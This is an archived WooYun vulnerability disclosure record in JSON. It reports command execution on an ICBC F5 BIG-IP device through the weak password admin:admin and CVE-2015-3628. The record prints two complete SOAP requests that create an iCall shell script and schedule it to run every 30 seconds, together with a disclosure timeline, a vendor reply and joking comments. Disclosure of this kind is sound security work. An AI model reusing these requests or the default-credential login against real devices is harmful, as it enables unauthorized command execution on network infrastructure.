bugs/wooyun-2016-0195485.json

{"id": 87288, "wybug_id": "wooyun-2016-0195485", "wybug_title": "工商银行某分站漏洞导致命令执行", "wybug_corp": "工商银行", "wybug_author": "白泽", "wybug_date": "2016-04-12 18:20", "wybug_open_date": "2016-05-30 16:30", "wybug_type": "网络未授权访问", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-30：\t细节向公众公开  简要描述： 工商银行某分站漏洞导致命令执行，工具有点6 详细说明：  工商银行F5负载均衡网络设备由于弱口令导致命令执行，设备泄露内网IP信息，负载均衡好像能做很多事。 0.0   漏洞证明：  \n**.**.**.**/xui/\n1、弱口令\n\n2、命令执行（CVE-2015-3628）\nPOST /iControl/iControlPortal.cgi HTTP/1.1 Accept-Encoding: gzip,deflate Content-Type: text/xml;charset=UTF-8 SOAPAction: urn:iControl:iCall/Script Host: **.**.**.**:443Content-Length: 866 Cookie: BIGIPAuthCookie=017EA784717D2DC416AFD90FB58842083DE1BD23; BIGIPAuthUsernameCookie=adminAuthorization: Basic YWRtaW46YWRtaW4=<soapenv:Envelope xmlns:xsi=\"http://**.**.**.**/2001/XMLSchema-instance\" xmlns:xsd=\"http://**.**.**.**/2001/XMLSchema\" xmlns:soapenv=\"http://**.**.**.**/soap/envelope/\" xmlns:scr=\"urn:iControl:iCall/Script\" xmlns:soapenc=\"http://**.**.**.**/soap/encoding/\"> <soapenv:Header/> <soapenv:Body> <scr:create soapenv:encodingStyle=\"http://**.**.**.**/soap/encoding/\"> <scripts xsi:type=\"urn:Common.StringSequence\" soapenc:arrayType=\"xsd:string[]\" xmlns:urn=\"urn:iControl\"><item>exploit</item></scripts> <definitions xsi:type=\"urn:Common.StringSequence\" soapenc:arrayType=\"xsd:string[]\" xmlns:urn=\"urn:iControl\"><item>exec /bin/sh -c \"id>/var/local/ucs/file.ucs;chmod a+r /var/local/ucs/file.ucs\"</item></definitions> </scr:create> </soapenv:Body> </soapenv:Envelope>POST /iControl/iControlPortal.cgi HTTP/1.1 Accept-Encoding: gzip,deflate Content-Type: text/xml;charset=UTF-8 SOAPAction: urn:iControl:iCall/PeriodicHandler Host: **.**.**.**:443Content-Length: 923 Cookie: BIGIPAuthCookie=017EA784717D2DC416AFD90FB58842083DE1BD23; BIGIPAuthUsernameCookie=adminAuthorization: Basic YWRtaW46YWRtaW4=<soapenv:Envelope xmlns:xsi=\"http://**.**.**.**/2001/XMLSchema-instance\" xmlns:xsd=\"http://**.**.**.**/2001/XMLSchema\" xmlns:soapenv=\"http://**.**.**.**/soap/envelope/\" xmlns:per=\"urn:iControl:iCall/PeriodicHandler\" xmlns:soapenc=\"http://**.**.**.**/soap/encoding/\"> <soapenv:Header/> <soapenv:Body> <per:create soapenv:encodingStyle=\"http://**.**.**.**/soap/encoding/\"> <handlers xsi:type=\"urn:Common.StringSequence\" soapenc:arrayType=\"xsd:string[]\" xmlns:urn=\"urn:iControl\"> <item>exploitHandler</item> </handlers> <scripts xsi:type=\"urn:Common.StringSequence\" soapenc:arrayType=\"xsd:string[]\" xmlns:urn=\"urn:iControl\"> <item>/Common/exploit</item> </scripts> <intervals xsi:type=\"urn:Common.ULongSequence\" soapenc:arrayType=\"xsd:long[]\" xmlns:urn=\"urn:iControl\"> <item>30</item> </intervals> </per:create> </soapenv:Body> </soapenv:Envelope>\n\n\n   修复方案：     版权声明：转载请注明来源 白泽@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-04-15 16:25 厂商回复： CNVD未复现所述情况,已经转由CNCERT直接通报给对应银行集团公司,由其后续协调网站管理部门处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-12 18:20 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:22        | 当我又回首一切,这个世界会好吗?)\t\t \n  屌字怎么写    \n     2016-04-12 18:54 |    \t\t白泽 \t\t\t( 普通白帽子  |\t\t\t        Rank:205 漏洞数:19        | 放假中。。。)\t\t \n  @xsser big dick    \n     2016-04-12 19:28 |    \t\t夏殇 \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:26        | 不忘初心，方得始终。)\t\t \n  有意思    \n     2016-04-12 20:48 |    \t\tYuku \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:27        | 数据挖掘)\t\t \n  下一站、天地银行。    \n     2016-04-15 20:40 |    \t\tmonburan \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 对这个世界的知识充满好奇)\t\t \n  厉害！    \n     2016-05-30 16:33 |    \t\tDusk \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:15        | 一波Rank即将到来)\t\t \n  给你3个6 666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}